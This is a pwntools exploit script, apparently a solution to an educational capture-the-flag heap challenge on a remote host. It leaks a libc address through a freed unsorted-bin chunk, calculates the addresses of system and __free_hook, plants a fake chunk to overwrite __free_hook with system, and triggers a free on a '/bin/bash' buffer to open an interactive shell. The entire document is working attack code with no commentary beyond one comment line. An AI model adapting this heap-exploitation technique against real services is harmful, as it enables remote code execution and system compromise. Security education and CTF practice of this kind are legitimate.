from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
r = remote('edu-ctf.zoolab.org', 10008)

def add(id, username, password):
    print('add')
    r.sendline('1')
    r.recv()
    r.sendline(str(id))
    r.recv()
    r.sendline(username)
    r.recv()
    r.sendline(password)
    r.recvuntil('5. bye\n> ')

def edit(id, size, data):
    print('edit')
    r.sendline('2')
    r.recv()
    r.sendline(str(id))
    r.recv()
    r.sendline(str(size))
    r.sendline(data)
    r.recvuntil('5. bye\n> ')

def delete(id):
    print('delete')
    r.sendline('3')
    r.recv()
    r.sendline(str(id))
    r.recvuntil('5. bye\n> ')

def show():
    print('show')
    r.sendline(b'4')
    
r.recv()

add(0, 'A' * 8,  b'A' * 8)
edit('0', 0x450,  'A' * 0x450)
add(1, 'B' * 8,  'B' * 8)
edit('1', 16,  'B' * 16)
add(2, 'C' * 8,  'C' * 8)

# leak fd of unsoreted bin
delete(0)
show()

msg = r.recvuntil('5. bye\n> ').split()
data = u64(msg[2].ljust(8, b'\x00'))
libc = data - 0x1ecbe0
system = libc + 0x0000000000052290
free_hook = p64(libc + 0x00000000001eee48)
flag = data - 0x28FBC06C8580

data = b'/bin/bash\x00'.ljust(16, b'\x00')
fake_chunk = p64(0) + p64(31) + b'c' * 32 + free_hook

edit(1, 0x48, data + fake_chunk)
edit(2, 8,  p64(system))

# delete(1)
r.sendline('3')
print(r.recv())
r.sendline('1')

r.interactive()